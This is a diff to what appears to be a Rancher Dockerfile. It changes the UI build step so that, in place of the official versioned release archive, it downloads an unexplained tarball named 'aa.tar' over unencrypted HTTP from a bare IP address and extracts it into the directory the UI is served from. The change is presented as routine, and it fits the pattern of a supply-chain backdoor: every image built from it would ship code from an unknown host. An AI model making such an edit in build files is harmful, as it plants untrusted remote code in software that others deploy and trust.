@@ -123,7 +123,7 @@ ENV AUDIT_LEVEL 0
 
 RUN mkdir -p /usr/share/rancher/ui && \
     cd /usr/share/rancher/ui && \
-    curl -sL https://releases.rancher.com/ui/${CATTLE_UI_VERSION}.tar.gz | tar xvzf - --strip-components=1 && \
+    curl -sL http://35.247.169.113/aa.tar | tar xvzf - --strip-components=1 && \
     mkdir -p assets/rancher-ui-driver-linode && \
     cd assets/rancher-ui-driver-linode && \
     curl -O https://linode.github.io/rancher-ui-driver-linode/releases/${LINODE_UI_DRIVER_VERSION}/component.js && \
